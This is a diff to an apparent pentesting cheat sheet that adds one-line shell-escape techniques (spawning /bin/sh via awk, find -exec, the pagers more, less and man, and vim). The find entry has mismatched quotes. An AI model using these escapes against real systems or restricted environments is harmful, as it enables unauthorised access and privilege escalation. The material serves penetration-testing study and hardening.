@@ -46,6 +46,28 @@ perl: exec "/bin/sh";
 ruby: exec "/bin/sh"
 ```
 
+**Awk**
+
+```
+awk 'BEGIN {system("/bin/sh")}'
+```
+
+**Find**
+
+```
+find / -name blahblah 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+```
+
+**More, less, or man**
+
+Type more, less, or man command with a file then try one of the following:
+
+```
+'! /bin/sh'
+'!/bin/sh'
+'!bash'
+```
+
 **Lua**
 
 ```
@@ -63,7 +85,11 @@ exec "/bin/sh"
 ```
 :!bash
 or
-:set shell=/bin/bash:shell
+:set shell=/bin/bash
+or
+:shell
+or
+:! /bin/bash
 ```
 
 **From within nmap**
